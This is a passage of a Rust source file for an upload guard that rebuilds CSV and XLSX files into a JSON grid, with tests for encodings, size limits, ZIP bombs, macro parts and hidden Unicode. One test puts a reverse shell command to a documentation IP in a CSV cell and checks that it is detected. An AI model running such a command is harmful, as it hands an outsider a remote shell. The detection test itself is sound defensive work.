                };
                if serial < 1.0 {
                    json!({"time": time})
                } else if serial.fract() == 0.0 {
                    json!({"date": format!("{year:04}-{month:02}-{day:02}")})
                } else {
                    json!({"datetime": format!("{year:04}-{month:02}-{day:02}T{time}")})
                }
            }
        }
        DataRef::DateTimeIso(s) => json!({"datetime": grid.text(s)?}),
        DataRef::DurationIso(s) => json!({"duration": grid.text(s)?}),
        DataRef::Error(e) => json!({"error": e.to_string()}),
    };
    grid.filled()?;
    Ok(cell)
}

/// Reads a grid back: its first line, and each sheet's rows.
pub fn read_grid(copy: &[u8]) -> Result<(Value, Vec<Vec<Value>>)> {
    let mut text = String::new();
    flate2::read::GzDecoder::new(copy)
        .read_to_string(&mut text)
        .context("grid not decompressed")?;
    let mut lines = text.lines();
    let first: Value = serde_json::from_str(lines.next().context("grid is empty")?)?;
    let mut sheets: Vec<Vec<Value>> = Vec::new();
    for line in lines {
        let value: Value = serde_json::from_str(line)?;
        if value.get("sheet").is_some() {
            sheets.push(Vec::new());
        } else {
            sheets
                .last_mut()
                .context("a row before its sheet")?
                .push(value);
        }
    }
    Ok((first, sheets))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::{Book, sample_book};

    fn rules() -> Rules {
        Rules::load(&crate::fixtures::rules_dir()).unwrap()
    }

    fn checked(bytes: &[u8], source: Source, max_copy: u64, limits: Limits) -> Rebuilt {
        rebuild(bytes, source, &rules(), max_copy, limits)
            .unwrap()
            .unwrap_or_else(|_| panic!("unreadable"))
    }

    fn rebuilt(bytes: &[u8], source: Source) -> Rebuilt {
        checked(bytes, source, 64 << 20, Limits::default())
    }

    fn unreadable(bytes: &[u8], source: Source) -> bool {
        matches!(
            rebuild(bytes, source, &rules(), 64 << 20, Limits::default()).unwrap(),
            Err(Unreadable)
        )
    }

    fn rows(copy: &[u8], sheet: usize) -> Vec<Vec<Value>> {
        read_grid(copy).unwrap().1[sheet]
            .iter()
            .map(|row| row.as_array().unwrap().clone())
            .collect()
    }

    #[test]
    fn a_text_table_keeps_every_field_as_written_and_its_rows_where_they_were() {
        // A note row, a header, a quoted field across two lines, an empty line, a field with a delimiter inside quotes.
        let text = "Study notes\r\nmouse,weight (g),comment\r\nM1,\"25,4\",\"first\nsecond\"\r\n\r\nM2, 24.9 ,\"says \"\"hi\"\"\"\r\n";
        let done = rebuilt(text.as_bytes(), Source::Delimited);
        assert_eq!(done.report.delimiter.as_deref(), Some(","));
        assert_eq!(done.report.encoding.as_deref(), Some("utf-8"));
        let copy = done.copy.as_ref().unwrap();
        let grid = rows(copy, 0);
        assert_eq!(grid[0], [json!("Study notes")]);
        assert_eq!(
            grid[1],
            [json!("mouse"), json!("weight (g)"), json!("comment")]
        );
        assert_eq!(
            grid[2],
            [json!("M1"), json!("25,4"), json!("first\nsecond")]
        );
        // The quoted field spans lines 3 and 4 and line 5 is empty, so the next record is the fifth row.
        assert_eq!(grid[3], Vec::<Value>::new());
        assert_eq!(
            grid[4],
            [json!("M2"), json!(" 24.9 "), json!("says \"hi\"")]
        );
        assert_eq!(grid.len(), 5);
        assert_eq!(done.report.sheets[0].rows, 5);
        assert_eq!(done.report.sheets[0].columns, 3);
        assert_eq!(done.report.sheets[0].cells, 10);
        let (first, _) = read_grid(copy).unwrap();
        assert_eq!(first["schema"], GRID_SCHEMA);
        assert_eq!(first["source"]["type"], "delimited");
        assert_eq!(first["source"]["bytes"], text.len());
        assert_eq!(
            first["source"]["sha256"],
            hex::encode(Sha256::digest(text.as_bytes()))
        );
        assert_eq!(first["source"]["sheets"][0]["rows"], 5);
    }

    #[test]
    fn delimiters_and_encodings_are_found_from_the_bytes() {
        let semicolons = "id;dose;value\nA;1;2,5\nB;2;3,75\n";
        let done = rebuilt(semicolons.as_bytes(), Source::Delimited);
        assert_eq!(done.report.delimiter.as_deref(), Some(";"));
        assert_eq!(rows(done.copy.as_ref().unwrap(), 0)[1][2], json!("2,5"));
        let tabs = "id\tvalue\nA\t1\n";
        assert_eq!(
            rebuilt(tabs.as_bytes(), Source::Delimited)
                .report
                .delimiter
                .as_deref(),
            Some("\t")
        );
        // Windows-1252: a micro sign as one byte.
        let done = rebuilt(b"unit\n\xB5g/mL\n", Source::Delimited);
        assert_eq!(done.report.encoding.as_deref(), Some("windows-1252"));
        assert_eq!(
            rows(done.copy.as_ref().unwrap(), 0)[1][0],
            json!("\u{B5}g/mL")
        );
        // UTF-16 with its mark, as Excel saves Unicode text.
        let mut wide = vec![0xFF, 0xFE];
        for unit in "a\tb\n1\t2\n".encode_utf16() {
            wide.extend_from_slice(&unit.to_le_bytes());
        }
        let done = rebuilt(&wide, Source::Delimited);
        assert_eq!(done.report.encoding.as_deref(), Some("utf-16le"));
        assert_eq!(
            rows(done.copy.as_ref().unwrap(), 0)[1],
            [json!("1"), json!("2")]
        );
        // A UTF-8 mark is not part of the first cell.
        let marked = rebuilt(b"\xEF\xBB\xBFname\nx\n", Source::Delimited);
        assert_eq!(rows(marked.copy.as_ref().unwrap(), 0)[0], [json!("name")]);
        // Lines that end with a carriage return alone keep their empty rows.
        let old_mac = rebuilt(b"a,b\r\r1,2\r", Source::Delimited);
        assert_eq!(
            rows(old_mac.copy.as_ref().unwrap(), 0),
            [
                vec![json!("a"), json!("b")],
                vec![],
                vec![json!("1"), json!("2")]
            ]
        );
    }

    #[test]
    fn quotes_are_read_as_spreadsheet_programs_read_them() {
        let records = |text: &str| -> Vec<Vec<String>> {
            Records::new(text, b',', 16)
                .map(|r| r.unwrap_or_else(|_| panic!("broken")))
                .collect()
        };
        // A quote that starts a field holds delimiters and line breaks; text after its closing quote joins the field;
        // a quote anywhere else is text; an empty last field and an empty line are kept.
        assert_eq!(
            records("\"a,b\"c,d \"e\",\r\n\n\"x\ny\"\r\"\"\"q\"\"\""),
            [
                vec!["a,bc", "d \"e\"", ""],
                vec![],
                vec!["x\ny"],
                vec!["\"q\""]
            ]
        );
        assert!(records("").is_empty());
        assert_eq!(records("a\n"), [vec!["a"]]);
        assert!(matches!(
            Records::new("a,\"b\n1,2\n", b',', 16).last(),
            Some(Err(Broken::Unterminated))
        ));
        assert!(matches!(
            Records::new("a,b,c\n", b',', 2).next(),
            Some(Err(Broken::TooWide))
        ));
        assert!(Records::new("a,b\n", b',', 2).all(|r| r.is_ok()));
        assert!(unreadable(b"a,\"b\n1,2\n", Source::Delimited));
    }

    #[test]
    fn bytes_that_are_not_text_are_not_a_table() {
        for bytes in [
            &b"a,b\n1,\x002\n"[..],
            b"a,b\n\x07,2\n",
            b"a,b\n\x8D,2\n",
            &[0xFF, 0xFE, 0x00, 0xD8, 0x41, 0x00][..],
        ] {
            assert!(unreadable(bytes, Source::Delimited), "{bytes:?}");
        }
        assert_eq!(
            refine(FileType::Unknown, b"a,b\n1,2\n", &[FileType::Delimited]),
            FileType::Delimited
        );
        assert_eq!(
            refine(FileType::Unknown, b"a\x00b", &[FileType::Delimited]),
            FileType::Unknown
        );
        assert_eq!(
            refine(FileType::Unknown, b"a,b\n", &[FileType::Pdf]),
            FileType::Unknown,
            "text is a table only where tables are allowed"
        );
        assert_eq!(
            refine(FileType::Zip, b"PK", &[FileType::Delimited, FileType::Xlsx]),
            FileType::Xlsx
        );
        assert_eq!(
            refine(FileType::Zip, b"PK", &[FileType::Pdf]),
            FileType::Zip
        );
    }

    #[test]
    fn a_table_past_a_bound_is_refused_whole() {
        let limits = |change: fn(&mut Limits)| {
            let mut limits = Limits::default();
            change(&mut limits);
            limits
        };
        let cases: [(&str, Limits, Limits, &str); 4] = [
            (
                "a,b\n1,2\n3,4\n",
                limits(|l| l.cells = 5),
                limits(|l| l.cells = 6),
                "filled cells",
            ),
            (
                "a\n1\n2\n",
                limits(|l| l.rows = 2),
                limits(|l| l.rows = 3),
                "more rows",
            ),
            (
                "a,b,c\n",
                limits(|l| l.columns = 2),
                limits(|l| l.columns = 3),
                "more columns",
            ),
            (
                "abcdef\n",
                limits(|l| l.cell_chars = 5),
                limits(|l| l.cell_chars = 6),
                "more text",
            ),
        ];
        // Each bound refuses one past its limit and passes the table at its limit.
        for (text, under, at, words) in cases {
            let done = checked(text.as_bytes(), Source::Delimited, 1 << 20, under);
            assert!(done.copy.is_none(), "{words}");
            let bound = done.report.too_large.unwrap();
            assert!(bound.contains(words), "{bound}");
            let done = checked(text.as_bytes(), Source::Delimited, 1 << 20, at);
            assert!(done.copy.is_some(), "{words}: {:?}", done.report.too_large);
        }
        let done = checked(
            b"a\nb\nc\nd\n",
            Source::Delimited,
            1 << 20,
            limits(|l| l.grid_bytes = 16),
        );
        assert!(done.report.too_large.unwrap().contains("more room"));
        let done = checked(b"a\n1\n", Source::Delimited, 10, Limits::default());
        assert!(done.copy.is_none());
        assert!(
            done.report
                .too_large
                .unwrap()
                .contains("larger than the guard keeps")
        );
    }

    #[test]
    fn invisible_characters_and_commands_in_cells_are_reported() {
        let text = "name,note\nA,ok\u{202E}\nB,hidden\u{E0041}\u{200B}\n";
        let done = rebuilt(text.as_bytes(), Source::Delimited);
        assert_eq!(
            done.report.unicode,
            UnicodeCounts {
                tags: 1,
                bidi: 1,
                zero_width: 1
            }
        );
        let shell = "name,note\nA,bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n";
        let done = rebuilt(shell.as_bytes(), Source::Delimited);
        assert!(
            done.report
                .matches
                .iter()
                .any(|m| m.rule == "reverse_shell_command"),
            "{:?}",
            done.report.matches
        );
        assert!(
            rebuilt(b"name\nplain words\n", Source::Delimited)
                .report
                .matches
                .is_empty()
        );
    }

    #[test]
    fn a_workbook_keeps_the_values_it_saved_where_they_were() {
        let done = rebuilt(&sample_book().bytes(), Source::Xlsx);
        let copy = done.copy.as_ref().unwrap();
        let weights = rows(copy, 0);
        assert_eq!(weights[0], Vec::<Value>::new(), "row 1 is empty");
        assert_eq!(
            weights[1],
            [json!("mouse"), json!("weight"), json!("born"), json!("ok")]
        );
        assert_eq!(
            weights[2],
            [
                json!("M1"),
                json!(25.4),
                json!({"date": "2025-01-01"}),
                json!(true),
                Value::Null,
                json!({"error": "#DIV/0!"})
            ]
        );
        // A formula keeps the value it was saved with; one saved without a value is empty, never run.
        assert_eq!(
            weights[3],
            [
                json!("M2"),
                json!(50.8),
                json!({"datetime": "2025-01-01T12:00:00"})
            ]
        );
        assert_eq!(weights[4], [json!({"seconds": 5400}), json!(3)]);
        assert_eq!(
            weights.len(),
            5,
            "a trailing row with nothing in it is left out"
        );
        assert_eq!(rows(copy, 1), [[json!(7)]]);
        assert_eq!(rows(copy, 2), [[json!("code")]]);
        let (first, _) = read_grid(copy).unwrap();
        let sheets = &first["source"]["sheets"];
        assert_eq!(sheets[0]["name"], "Weights");
        assert_eq!(sheets[0]["merged"], json!([[1, 0, 1, 1]]));
        assert_eq!(sheets[0]["hidden"], false);
        assert_eq!(sheets[1]["hidden"], true);
        assert_eq!(sheets[2]["hidden"], true, "a very hidden sheet is hidden");
        let report = &done.report;
        assert_eq!(report.sheets[0].formulas, 2);
        assert_eq!(report.sheets[0].formulas_without_values, 1);
        assert_eq!(report.sheets[0].cells, 14);
        assert_eq!(report.sheets[0].merged, 1);
        assert!(report.sheets[1].hidden);
        assert_eq!(report.structure, Structure::default());
    }

    #[test]
    fn parts_that_run_embed_or_reach_out_are_counted() {
        // An unlisted macro sheet part counts; its relationships do not.
        let book = sample_book()
            .with("xl/vbaProject.bin", b"macro project")
            .with("xl/macrosheets/sheet1.xml", b"<xm:macrosheet/>")
            .with("xl/macrosheets/_rels/sheet1.xml.rels", b"<Relationships/>")
            .with("xl/embeddings/oleObject1.bin", b"object")
            .with("xl/activeX/activeX1.xml", b"<ax/>")
            .with("xl/externalLinks/externalLink1.xml", b"<externalLink/>")
            .with("xl/connections.xml", b"<connections/>");
        assert_eq!(
            rebuilt(&book.bytes(), Source::Xlsx).report.structure,
            Structure {
                macros: 2,
                embedded: 1,
                controls: 1,
                external: 2,
                declarations: 0
            }
        );
        let macro_enabled = sample_book().replace(
            "[Content_Types].xml",
            "spreadsheetml.sheet.main+xml",
            "ms-excel.sheet.macroEnabled.main+xml",
        );
        assert_eq!(
            rebuilt(&macro_enabled.bytes(), Source::Xlsx)
                .report
                .structure
                .macros,
            1
        );
        // A declaration is counted wherever it sits, also past the first read of a part.
        let padding = format!("<!--{}-->", "x".repeat(100_000));
        let declared = sample_book().replace(
            "xl/styles.xml",
            "<styleSheet",
            &format!("{padding}<!DOCTYPE s><styleSheet"),
        );
        match rebuild(
            &declared.bytes(),
            Source::Xlsx,
            &rules(),
            64 << 20,
            Limits::default(),
        )
        .unwrap()
        {
            Ok(done) => assert_eq!(done.report.structure.declarations, 1),
            Err(Unreadable) => panic!("a declared document type is counted, not unreadable"),
        }
    }

    #[test]
    fn what_is_not_a_readable_workbook_is_said_so() {
        let archive = Book::empty().with("notes.txt", b"hello");
        let done = rebuilt(&archive.bytes(), Source::Xlsx);
        assert!(done.report.archive_without_workbook);
        assert!(done.copy.is_none());
        let out_of_order = Book::new(&[(
            "S",
            "visible",
            r#"<row r="3"><c r="A3"><v>1</v></c></row><row r="2"><c r="A2"><v>2</v></c></row>"#,
        )]);
        assert!(unreadable(b"not a zip", Source::Xlsx));
        assert!(unreadable(&out_of_order.bytes(), Source::Xlsx));
        // A part that decompresses past the size the package claims for it.
        let mut lying = sample_book().bytes();
        assert!(crate::fixtures::change_claim(
            &mut lying,
            "xl/styles.xml",
            -1
        ));
        assert!(unreadable(&lying, Source::Xlsx));
        // A part that holds less than it claims.
        let mut short = sample_book().bytes();
        assert!(crate::fixtures::change_claim(
            &mut short,
            "xl/styles.xml",
            1
        ));
        assert!(unreadable(&short, Source::Xlsx));
        // A part that claims little and holds more than a part may is unreadable, found at the first read past its
        // claim rather than read to the bound.
        let mut bomb = sample_book()
            .with("xl/media/padding.xml", &vec![b' '; 4096])
            .bytes();
        assert!(crate::fixtures::change_claim(
            &mut bomb,
            "xl/media/padding.xml",
            -1
        ));
        let limits = Limits {
            part_bytes: 4000,
            ..Limits::default()
        };
        assert!(matches!(
            rebuild(&bomb, Source::Xlsx, &rules(), 64 << 20, limits).unwrap(),
            Err(Unreadable)
        ));
        // The reader refuses a workbook that lists a macro sheet.
        let listed = sample_book()
            .with("xl/macrosheets/sheet9.xml", b"<xm:macrosheet/>")
            .replace(
                "xl/workbook.xml",
                "</sheets>",
                r#"<sheet name="Auto" sheetId="9" r:id="rIdM"/></sheets>"#,
            )
            .replace(
                "xl/_rels/workbook.xml.rels",
                "</Relationships>",
                r#"<Relationship Id="rIdM" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet9.xml"/></Relationships>"#,
            );
        assert!(unreadable(&listed.bytes(), Source::Xlsx));
        let far = Book::new(&[("S", "visible", r#"<row r="2"><c r="C2"><v>1</v></c></row>"#)]);
        let limits = Limits {
            columns: 2,
            ..Limits::default()
        };
        let done = checked(&far.bytes(), Source::Xlsx, 64 << 20, limits);
        assert!(
            done.report
                .too_large
                .unwrap()
                .contains("last row or column")
        );
    }

    #[test]
    fn a_package_past_its_bounds_is_refused_whole() {
        let book = sample_book().bytes();
        let mut archive = ::zip::ZipArchive::new(Cursor::new(book.as_slice())).unwrap();
        let parts = archive.len();
        let sizes: Vec<u64> = (0..parts)
            .map(|i| archive.by_index(i).unwrap().size())
            .collect();
        let (total, largest) = (sizes.iter().sum::<u64>(), *sizes.iter().max().unwrap());
        let at = |limits: Limits| checked(&book, Source::Xlsx, 64 << 20, limits);
        // Each bound passes the package at its limit and refuses it one below.
        for (fits, refused, words) in [
            (
                Limits {
                    parts,
                    ..Limits::default()
                },
                Limits {
                    parts: parts - 1,
                    ..Limits::default()
                },
                "more parts",
            ),
            (
                Limits {
                    part_bytes: largest,
                    ..Limits::default()
                },
                Limits {
                    part_bytes: largest - 1,
                    ..Limits::default()
                },
                "decompresses to more",
            ),
            (
                Limits {
                    package_bytes: total,
                    ..Limits::default()
                },
                Limits {
                    package_bytes: total - 1,
                    ..Limits::default()
                },
                "decompresses to more",
            ),
        ] {
            assert!(at(fits).copy.is_some(), "{words}");
            let done = at(refused);
            assert!(done.copy.is_none(), "{words}");
            assert!(done.report.too_large.unwrap().contains(words), "{words}");
        }
    }

    #[test]
    fn counts_a_reader_sizes_from_are_checked_before_it_reads() {
        // An end record naming more parts than the limit is refused before the ZIP reader reads its directory.
        let mut book = sample_book().bytes();
        let end = book.windows(4).rposition(|w| w == b"PK\x05\x06").unwrap();
        for at in [end + 8, end + 10] {
            book[at..at + 2].copy_from_slice(&20_000_u16.to_le_bytes());
        }
        let done = checked(&book, Source::Xlsx, 64 << 20, Limits::default());
        assert!(done.report.too_large.unwrap().contains("more parts"));
        // So is a ZIP64 record the end record points to; one naming the parts the package has is read.
        let zip64 = |entries: u64| {
            let book = sample_book().bytes();
            let end = book.windows(4).rposition(|w| w == b"PK\x05\x06").unwrap();
            let u32_at = |at: usize| u32::from_le_bytes(book[at..at + 4].try_into().unwrap());
            let (size, offset) = (u64::from(u32_at(end + 12)), u64::from(u32_at(end + 16)));
            let mut out = book[..end].to_vec();
            out.extend_from_slice(b"PK\x06\x06");
            out.extend_from_slice(&44_u64.to_le_bytes());
            out.extend_from_slice(&[45, 0, 45, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
            for value in [entries, entries, size, offset] {
                out.extend_from_slice(&value.to_le_bytes());
            }
            out.extend_from_slice(b"PK\x06\x07\0\0\0\0");
            out.extend_from_slice(&(end as u64).to_le_bytes());
            out.extend_from_slice(&1_u32.to_le_bytes());
            out.extend_from_slice(b"PK\x05\x06\0\0\0\0\xff\xff\xff\xff");
            out.extend_from_slice(&book[end + 12..end + 20]);
            out.extend_from_slice(&[0, 0]);
            out
        };
        let parts = ::zip::ZipArchive::new(Cursor::new(sample_book().bytes()))
            .unwrap()
            .len();
        let done = checked(
            &zip64(parts as u64),
            Source::Xlsx,
            64 << 20,
            Limits::default(),
        );
        assert!(done.copy.is_some(), "{:?}", done.report.too_large);
        let done = checked(&zip64(20_000), Source::Xlsx, 64 << 20, Limits::default());
        assert!(done.report.too_large.unwrap().contains("more parts"));
        // A shared-texts element naming more texts than cells the upload accepts is refused before the workbook reader
        // reserves room for them; a comment that looks like the element is not it.
        let texts = |unique: u64| {
            Book::new(&[(
                "Texts",
                "visible",
                r#"<row r="1"><c r="A1" t="s"><v>0</v></c></row>"#,
            )])
            .with(
                "xl/sharedStrings.xml",
                format!(
                    r#"<?xml version="1.0"?><!-- <sst uniqueCount="1"> --><sst count="1" uniqueCount="{unique}"><si><t>x</t></si></sst>"#
                )
                .as_bytes(),
            )
            .bytes()
        };
        let limits = Limits {
            cells: 10,
            ..Limits::default()
        };
        let done = checked(&texts(10), Source::Xlsx, 64 << 20, limits);
        assert_eq!(rows(&done.copy.unwrap(), 0), [vec![json!("x")]]);
        let done = checked(&texts(11), Source::Xlsx, 64 << 20, limits);
        assert!(done.report.too_large.unwrap().contains("different texts"));
    }

    #[test]
    fn a_row_and_the_first_line_are_held_within_the_grids_room() {
        let room = Limits {
            grid_bytes: 100,
            ..Limits::default()
        };
        // A row's texts are counted before the row is written.
        let mut grid = Grid::new(room);
        assert!(grid.text(&"x".repeat(60)).is_ok());
        assert!(grid.text(&"y".repeat(40)).is_ok());
        assert!(matches!(grid.text("z"), Err(Stop::TooLarge)));
        // A line is written only as far as the room.
        let mut grid = Grid::new(room);
        assert!(matches!(
            grid.line(&json!(["z".repeat(200)])),
            Err(Stop::TooLarge)
        ));
        assert!(grid.text.len() <= 100);
        // The first line counts: rows that fit with a first line that does not are refused.
        let done = checked(
            b"a\n",
            Source::Delimited,
            1 << 20,
            Limits {
                grid_bytes: 64,
                ..Limits::default()
            },
        );
        assert!(done.report.too_large.unwrap().contains("more room"));
    }

    #[test]
    fn a_declaration_split_between_two_reads_is_found() {
        for split in 1..9 {
            let mut declarations = Declarations::default();
            let text = b"<a/><!DOCTYPE s>";
            declarations.feed(&text[..4 + split]);
            assert!(!declarations.found);
            declarations.feed(&text[4 + split..]);
            assert!(declarations.found, "split at {split}");
        }
        let mut entity = Declarations::default();
        entity.feed(b"x<!ENT");
        entity.feed(b"ITY e>");
        assert!(entity.found);
        let mut none = Declarations::default();
        none.feed(b"<!-- DOCTYPE -->");
        assert!(!none.found);
    }

    #[test]
    fn the_rebuilt_copy_may_take_exactly_what_the_guard_keeps() {
        let table = b"a,b\n1,2\n";
        let size = rebuilt(table, Source::Delimited).copy.unwrap().len() as u64;
        assert!(
            checked(table, Source::Delimited, size, Limits::default())
                .copy
                .is_some()
        );
        assert!(
            checked(table, Source::Delimited, size - 1, Limits::default())
                .copy
                .is_none()
        );
    }

    #[test]
    fn numbers_keep_their_values() {
        assert_eq!(number(3.0), json!(3));
        assert_eq!(number(-0.0), json!(0));
        assert_eq!(number(25.4), json!(25.4));
        assert_eq!(number(EXACT), json!(EXACT));
        assert_eq!(number(EXACT - 1.0), json!(9_007_199_254_740_991_i64));
        assert_eq!(number(f64::NAN), json!({"error": "#NUM!"}));
    }
}
